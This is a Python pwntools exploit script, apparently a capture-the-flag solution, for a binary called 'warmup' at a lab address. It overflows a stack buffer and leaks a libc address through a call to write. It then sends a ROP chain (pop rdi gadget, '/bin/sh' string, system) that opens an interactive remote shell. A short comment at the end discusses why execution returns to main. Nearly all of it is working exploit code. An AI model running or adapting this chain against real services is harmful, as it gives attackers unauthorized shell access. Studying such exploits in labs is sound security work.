#!/usr/bin/env python3

"""
This is Version 1 Exploit Code
"""

from pwn import *

p = remote("172.18.0.2", 10001)
e = ELF("./warmup")
libc = ELF("./libc.so.6")

#context.log_level = 'debug'

padding = "C".encode() * 0x38

payload = padding
payload +=  p64(e.plt['write'])

p.sendafter("> ", payload)
p.recvn(0x40)
libc.address = u64(p.recvn(8)) - 0x3f20ca # Offset
log.critical(f"libc.address: {hex(libc.address)}")
p.recvn(0xc0 - 0x48)

rdi = libc.address + 0x00000000000215bf
binsh = libc.search(b"/bin/sh\x00").__next__()
system = libc.sym['system']

log.info(f"libc.address: {hex(libc.address)}")
log.info(f"gadget: {hex(rdi)}")
log.info(f"/bin/sh: {hex(binsh)}")
log.info(f"system: {hex(system)}")

payload = padding
payload += p64(rdi)
payload += p64(binsh)
payload += p64(system)

p.sendafter("> ", payload)

p.interactive()

"""
- Why program starts from main after manipulates ret address to write?

After called write fuction, program is calling '_dl_start_user+50' and that works like:

   0x7faa3596d0ca <_dl_start_user+50>:  lea    rdx,[rip+0xfa6f]        # 0x7faa3597cb40 <_dl_fini>
   0x7faa3596d0d1 <_dl_start_user+57>:  mov    rsp,r13
   0x7faa3596d0d4 <_dl_start_user+60>:  jmp    r12

In _dl_start_user+60 is jumped r12 register value and there are stored main function address

I didn't sure why that register stored main address at now.

- What is _dl_start_user

I think it's not important in this challenge but just for reference.

https://www.gnu.org/software/hurd/glibc/startup.html
"""
